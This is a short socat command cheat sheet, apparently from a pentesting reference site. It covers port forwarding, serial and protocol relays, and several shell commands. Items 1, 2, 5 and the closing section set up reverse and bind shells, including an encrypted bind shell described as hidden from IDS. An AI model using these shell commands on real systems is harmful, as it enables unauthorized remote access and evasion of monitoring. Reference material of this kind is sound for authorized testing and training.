---
title: Socat Command List
date: 2026-01-05
category: commands
enrich: false
tags: socat, cybersecurity, command reference
description: Top 10 essential commands for socat.
---

# Socat Command Guide

**Socat** is Netcat on steroids. It supports files, pipes, devices (serial line, pseudo-terminal, etc), sockets, SSL, and more.

## Top 10 Useful Commands

### 1. Fully TTY Shell (Listener)
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
**Explanation:** Listens for a shell and sets up a stable terminal (allows Ctrl+C, arrow keys).

### 2. TTY Shell (Connect)
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444
```
**Explanation:** Sends a fully interactive bash shell.

### 3. Port Forwarding
```bash
socat TCP-LISTEN:8080,fork TCP:10.10.10.20:80
```
**Explanation:** Listens on 8080. Forwards all traffic to 10.10.10.20:80. The `fork` allows multiple connections.

### 4. File Transfer
```bash
socat TCP4-LISTEN:4444,fork file:filename.txt,create
```
**Explanation:** Host a file.

### 5. SSL Listener
```bash
socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
```
**Explanation:** Encrypted Bind Shell. Traffic is hidden from IDS.

### 6. SSL Connect
```bash
socat - OPENSSL:10.10.10.10:443,verify=0
```
**Explanation:** Connect to the SSL listener.

### 7. Bridge 2 Ports
```bash
socat TCP:10.10.10.10:80 TCP:127.0.0.1:8080
```
**Explanation:** Connects a remote port to a local port.

### 8. Serial Connection
```bash
socat - /dev/ttyUSB0,b115200
```
**Explanation:** Connect to serial console.

### 9. UDP to TCP
```bash
socat UDP-LISTEN:53,fork TCP:10.10.10.10:53
```
**Explanation:** Convert protocols (relay UDP DNS to TCP DNS).

### 10. Verbose
```bash
socat -d -d ...
```
**Explanation:** Print fatal/warning messages.

## The Most Powerful Command
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
**Explanation:** The "Magic" listener. It stabilizes your reverse shell immediately, preventing you from accidentally killing it with Ctrl+C and giving you full tab completion.

